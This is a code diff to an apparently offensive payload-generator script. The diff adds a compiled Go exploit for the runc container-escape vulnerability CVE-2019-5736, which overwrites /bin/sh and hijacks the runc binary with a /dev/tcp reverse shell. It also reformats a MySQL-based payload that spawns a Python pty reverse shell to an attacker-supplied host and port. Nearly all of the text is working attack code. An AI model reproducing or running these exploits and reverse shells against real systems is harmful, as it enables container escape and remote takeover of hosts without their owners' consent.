@@ -254,32 +254,32 @@ def build_mysql_payload(lhost, lport):
     payload ='''package main
 
 import (
-	"github.com/ThomasRooney/gexpect"
-	"fmt"
-	"os"
+    "github.com/ThomasRooney/gexpect"
+    "fmt"
+    "os"
 )
 
 func main() {
 
-	child, err := gexpect.Spawn("mysql -u %s -p%s")''' % (username, password)
+    child, err := gexpect.Spawn("mysql -u %s -p%s")''' % (username, password)
     payload += '''
 
-	if err != nil {
-		panic(err)
-	}
+    if err != nil {
+        panic(err)
+    }
 
-	match, _ := child.ExpectRegexFind(".*[m|M][y|Y][s|S][q|Q][l|L].*")
+    match, _ := child.ExpectRegexFind(".*[m|M][y|Y][s|S][q|Q][l|L].*")
 
-	if len(match) == 0 {
-		fmt.Println("Wrong credentials.")
-		child.Close()
-		os.Exit(3)
-	}
+    if len(match) == 0 {
+        fmt.Println("Wrong credentials.")
+        child.Close()
+        os.Exit(3)
+    }
 '''
     payload += '''child.SendLine("\\\! python -c 'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\\"%s\\", %s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\"/bin/bash\\");s.close()'")''' % (lhost, lport)
     payload += '''
     child.Interact()
-	child.Close()
+    child.Close()
 }'''
 
     with open('/tmp/mysql_x64.go', 'w') as f:
@@ -375,7 +375,7 @@ port='%s'
 ''' % (lhost, lport)
 
     payload += '''payload='#!/bin/bash\\necho "exec 5<>/dev/tcp/%s/%s && cat <&5|/bin/bash 2>&5 >&5"|/bin/bash\\n' % (host, port)
-target_file='/bin/bash'
+target_file='/bin/sh'
 
 if __name__ == '__main__':
 
@@ -427,6 +427,85 @@ if __name__ == '__main__':
     print('[+] Saved: cve-2019-5736.py')
 
 
+def build_dockerb(lhost, lport):
+
+    payload = '''package main
+import (
+    "fmt"
+    "io/ioutil"
+    "os"
+    "strconv"
+    "strings"
+)
+
+var payload = "#!/bin/bash\\necho 'exec 5<>/dev/tcp/%s/%s && cat <&5|/bin/bash 2>&5 >&5'|/bin/bash\\n" 
+''' % (lhost, lport)
+
+    payload += '''
+func main() {
+    fd, err := os.Create("/bin/sh")
+    if err != nil {
+        fmt.Println(err)
+        return
+    }
+    fmt.Fprintln(fd, "#!/proc/self/exe")
+    err = fd.Close()
+    if err != nil {
+        fmt.Println(err)
+        return
+    }
+    fmt.Println("[+] Overwritten /bin/sh successfully")
+
+    var found int
+    for found == 0 {
+        pids, err := ioutil.ReadDir("/proc")
+        if err != nil {
+            fmt.Println(err)
+            return
+        }
+        for _, f := range pids {
+            fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
+            fstring := string(fbytes)
+            if strings.Contains(fstring, "runc") {
+                fmt.Println("[+] Found the PID:", f.Name())
+                found, err = strconv.Atoi(f.Name())
+                if err != nil {
+                    fmt.Println(err)
+                    return
+                }
+            }
+        }
+    }
+
+    var handleFd = -1
+    for handleFd == -1 {
+        // Note, you do not need to use the O_PATH flag for the exploit to work.
+        handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
+        if int(handle.Fd()) > 0 {
+            handleFd = int(handle.Fd())
+        }
+    }
+    fmt.Println("[+] Successfully got the file handle")
+
+    for {
+        writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
+        if int(writeHandle.Fd()) > 0 {
+            fmt.Println("[+] Successfully got write handle", writeHandle)
+            writeHandle.Write([]byte(payload))
+            return
+        }
+    }
+}'''
+
+    with open('/tmp/cve-2019-5736.go', 'w') as f:
+        f.write(payload)
+    print('[+] Saved: /tmp/cve-2019-5736.go')
+
+    print('[+] Compile: /tmp/cve-2019-5736.go')
+    os.system('go build /tmp/cve-2019-5736.go')
+    print('[+] Saved: cve-2019-5736')
+
+
 def python_reverse_shell(lhost,lport, ver=''):
     python_rev_shell = '''python%s -c \'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);\
   s.connect(("%s", %s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()\'''' % (ver, lhost, lport)
@@ -452,7 +531,8 @@ Simplifies payload creation and listener.
     lin32    <LHOST> <LPORT>  |   x32 Linux payload
     mysql64  <LHOST> <LPORT>  |   x64 Linux mysql payload
     mofnc    <LHOST> <LPORT>  |   netcat reverse_tcp mof payload
-    dockerp  <LHOST> <LPORT>  |   cve-2019-5736 docker payload 
+    dockerpy <LHOST> <LPORT>  |   cve-2019-5736 docker payload 
+    dockerb  <LHOST> <LPORT>  |   cve-2019-5736 docker compiled payload 
                               |
   <~~~~~~~~~~~~~~~~~~~~~~~[Payloads CLI]~~~~~~~~~~~~~~~~~~~~~~~~~~>
                               |
@@ -638,8 +718,12 @@ if __name__ == '__main__':
         build_mof(lhost, lport)
         sys.exit(0)
 
-    if type == 'dockerp':
+    if type == 'dockerpy':
         build_dockerp(lhost, lport)
+        sys.exit(0)
+
+    if type == 'dockerb':
+        build_dockerb(lhost, lport)
         sys.exit(0)
 
     if type[-1] == 's':
